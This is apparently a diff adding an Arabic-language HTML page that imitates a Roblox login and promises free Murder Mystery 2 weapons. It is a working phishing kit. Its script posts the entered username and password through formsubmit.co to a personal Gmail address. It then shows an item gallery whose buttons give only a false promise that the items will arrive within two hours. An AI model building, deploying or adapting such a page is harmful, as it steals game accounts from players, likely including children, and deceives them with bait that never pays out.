@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل دخول + أسلحة MM2</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial;
+      background-color: #1c1c1c;
+      color: white;
+      direction: rtl;
+    }
+    .center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .hidden { display: none; }
+
+    /* Login Box */
+    .login-box {
+      background-color: #2a2a2a;
+      padding: 40px 30px;
+      border-radius: 10px;
+      width: 360px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+      background-color: #333;
+      color: #fff;
+      font-size: 16px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #d32f2f;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    /* Weapons Section */
+    .weapons {
+      padding: 20px;
+    }
+    .weapons h1 {
+      text-align: center;
+      color: #ff4444;
+      margin-bottom: 30px;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 15px;
+    }
+    .card {
+      background: #2a2a2a;
+      padding: 10px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 0 8px rgba(0,0,0,0.4);
+    }
+    .card img {
+      width: 100%;
+      height: 140px;
+      object-fit: contain;
+      background: #111;
+      border-radius: 8px;
+    }
+    .card h2 {
+      font-size: 16px;
+      margin: 10px 0;
+      color: #ffd700;
+    }
+    .card button {
+      background: #ff4444;
+      border: none;
+      color: #fff;
+      padding: 8px 15px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .card button:hover {
+      background-color: #cc0000;
+    }
+    .message {
+      display: none;
+      margin-top: 6px;
+      color: #8bc34a;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- تسجيل الدخول -->
+  <div class="center" id="loginSection">
+    <div class="login-box">
+      <h2>تسجيل الدخول إلى Roblox</h2>
+      <input type="text" id="username" placeholder="اسم المستخدم" required>
+      <input type="password" id="password" placeholder="كلمة المرور" required>
+      <button onclick="sendData()">تسجيل الدخول</button>
+    </div>
+  </div>
+
+  <!-- معرض الأسلحة -->
+  <div class="weapons hidden" id="weaponsSection">
+    <h1>🗡️ أقوى أسلحة MM2</h1>
+    <div class="grid" id="weaponGrid"></div>
+  </div>
+
+  <script>
+    function sendData() {
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+
+      if (!username || !password) {
+        alert("يرجى ملء كل الحقول.");
+        return;
+      }
+
+      // إرسال البيانات إلى البريد
+      fetch("https://formsubmit.co/ajax/moosefo1@gmail.com", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify({
+          username: username,
+          password: password
+        })
+      })
+      .then(response => {
+        if (response.ok) {
+          showWeapons();
+        } else {
+          alert("حدث خطأ أثناء الإرسال.");
+        }
+      })
+      .catch(error => {
+        alert("فشل في الإرسال.");
+        console.error(error);
+      });
+    }
+
+    function showWeapons() {
+      document.getElementById('loginSection').style.display = 'none';
+      document.getElementById('weaponsSection').classList.remove('hidden');
+      loadWeapons();
+    }
+
+    function loadWeapons() {
+      const weapons = [
+        { name: "Candy", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/5/57/Candy.png" },
+        { name: "Harvester", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/6/6d/Harvester.png" },
+        { name: "Chroma Seer", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/3/3f/Chroma_Seer.png" },
+        { name: "Iceblaster", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/b/b2/Iceblaster.png" },
+        { name: "Chroma Luger", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/e/e9/Chroma_Luger.png" },
+        { name: "Swirly Blade", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/1/15/Swirly_Blade.png" },
+        { name: "Elderwood Blade", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/3/33/Elderwood_Blade.png" },
+        { name: "Batwing", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/1/12/Batwing.png" },
+        { name: "Icewing", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/6/66/Icewing.png" },
+        { name: "Lightbringer", img: "https://static.wikia.nocookie.net/murder-mystery-2/images/e/e1/Lightbringer.png" }
+      ];
+
+      const grid = document.getElementById('weaponGrid');
+      weapons.forEach(w => {
+        const card = document.createElement('div');
+        card.className = 'card';
+        card.innerHTML = `
+          <img src="${w.img}" alt="${w.name}">
+          <h2>${w.name}</h2>
+          <button onclick="this.nextElementSibling.style.display = 'block'">احصل عليه</button>
+          <div class="message">✅ سيتم إرسال الطلب خلال ساعتين</div>
+        `;
+        grid.appendChild(card);
+      });
+    }
+  </script>
+
+</body>
+</html>
